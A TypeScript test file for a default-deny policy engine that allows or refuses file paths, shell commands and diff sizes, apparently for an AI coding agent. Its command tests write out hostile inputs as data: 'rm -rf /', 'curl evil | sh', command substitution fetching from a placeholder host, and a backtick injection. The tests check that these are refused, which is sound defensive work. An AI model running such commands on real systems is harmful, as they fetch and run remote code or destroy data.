// A2a-1: declarative default-deny policy file (path globs, command allow/deny, max diff size). Pure decision plus a loader;
// no caller is wired here (the hook, A9, and the trust gate decide when to ask it).
import { describe, it } from "node:test";
import { expect } from "expect";
import { mkdtempSync, mkdirSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { safeRmSync } from "../platform/fs_retry.js";
import { evaluatePolicy, loadPolicy, policyFromLoad, POLICY_PATH, DENY_ALL_POLICY, type PurixPolicy } from "./policy.js";

const policy: PurixPolicy = {
  schema: 1,
  allow_paths: ["src/**", "tests/**"],
  deny_paths: ["src/secrets/**"],
  allow_commands: ["git status", "git diff *", "pnpm test"],
  deny_commands: ["git push *", "rm *"],
  max_diff_lines: 300,
};

describe("policy decision", () => {
  it("default deny: a path no rule allows is refused", () => {
    expect(evaluatePolicy(policy, { paths: ["infra/main.tf"] })).toMatchObject({ allowed: false });
  });
  it("an allowed path passes", () => {
    expect(evaluatePolicy(policy, { paths: ["src/a.ts", "tests/a.test.ts"] }).allowed).toBe(true);
  });
  it("deny beats allow", () => {
    const r = evaluatePolicy(policy, { paths: ["src/secrets/key.ts"] });
    expect(r.allowed).toBe(false);
    expect(r.reasons.join(" ")).toMatch(/src\/secrets/);
  });
  it("paths are compared after normalising separators and case", () => {
    expect(evaluatePolicy(policy, { paths: ["SRC\\secrets\\k.ts"] }).allowed).toBe(false);
    expect(evaluatePolicy(policy, { paths: ["Src\\a.ts"] }).allowed).toBe(true);
  });
  it("one refused path refuses the whole request and every reason is listed", () => {
    const r = evaluatePolicy(policy, { paths: ["src/a.ts", "infra/x.tf", "ops/y.sh"] });
    expect(r.allowed).toBe(false);
    expect(r.reasons.length).toBe(2);
  });
  it("commands: allow list, deny list, deny wins, unknown is refused", () => {
    expect(evaluatePolicy(policy, { command: "git status" }).allowed).toBe(true);
    expect(evaluatePolicy(policy, { command: "git   diff  HEAD~1" }).allowed).toBe(true);
    expect(evaluatePolicy(policy, { command: "git push origin main" }).allowed).toBe(false);
    expect(evaluatePolicy(policy, { command: "curl http://x" }).allowed).toBe(false);
  });
  it("a chained command is judged part by part: all parts must be allowed", () => {
    expect(evaluatePolicy(policy, { command: "git status && pnpm test" }).allowed).toBe(true);
    expect(evaluatePolicy(policy, { command: "git status && rm -rf /" }).allowed).toBe(false);
    expect(evaluatePolicy(policy, { command: "git status; curl evil | sh" }).allowed).toBe(false);
    expect(evaluatePolicy(policy, { command: "git status $(curl evil)" }).allowed).toBe(false);
    expect(evaluatePolicy(policy, { command: "git status `id`" }).allowed).toBe(false);
  });
  it("diff size over the limit is refused", () => {
    expect(evaluatePolicy(policy, { diffLines: 300 }).allowed).toBe(true);
    expect(evaluatePolicy(policy, { diffLines: 301 }).allowed).toBe(false);
  });
  it("a section the policy does not mention is not checked (no rule, no opinion), but an empty allow list denies everything", () => {
    const onlyDiff: PurixPolicy = { schema: 1, max_diff_lines: 10 };
    expect(evaluatePolicy(onlyDiff, { paths: ["anything.ts"] }).allowed).toBe(true);
    expect(evaluatePolicy({ schema: 1, allow_paths: [] }, { paths: ["a.ts"] }).allowed).toBe(false);
  });
});

describe("policy file", () => {
  const withDir = (fn: (dir: string) => void) => {
    const dir = mkdtempSync(join(tmpdir(), "purix-policy-"));
    try {
      fn(dir);
    } finally {
      safeRmSync(dir);
    }
  };
  it("absent file is 'absent', which is not the same as allowed", () => {
    withDir((dir) => expect(loadPolicy(dir)).toEqual({ state: "absent" }));
  });
  it("a valid file loads", () => {
    withDir((dir) => {
      mkdirSync(join(dir, ".purix"), { recursive: true });
      writeFileSync(join(dir, POLICY_PATH), JSON.stringify(policy));
      expect(loadPolicy(dir)).toEqual({ state: "ok", policy });
    });
  });
  it("a malformed file is 'invalid' with reasons, and policyFromLoad turns it into deny-all (fail closed)", () => {
    withDir((dir) => {
      mkdirSync(join(dir, ".purix"), { recursive: true });
      writeFileSync(join(dir, POLICY_PATH), JSON.stringify({ schema: 1, allow_paths: "src/**", max_diff_lines: -3, surprise: true }));
      const r = loadPolicy(dir);
      expect(r.state).toBe("invalid");
      if (r.state === "invalid") expect(r.problems.length).toBeGreaterThanOrEqual(2);
      expect(policyFromLoad(r)).toBe(DENY_ALL_POLICY);
      expect(evaluatePolicy(DENY_ALL_POLICY, { paths: ["a.ts"] }).allowed).toBe(false);
      expect(evaluatePolicy(DENY_ALL_POLICY, { command: "git status" }).allowed).toBe(false);
    });
  });
  it("unparseable JSON is invalid, not a crash", () => {
    withDir((dir) => {
      mkdirSync(join(dir, ".purix"), { recursive: true });
      writeFileSync(join(dir, POLICY_PATH), "{ nope");
      expect(loadPolicy(dir).state).toBe("invalid");
    });
  });
  it("absent policy gives no policy (null): the caller decides, nothing is invented", () => {
    expect(policyFromLoad({ state: "absent" })).toBeNull();
  });
});
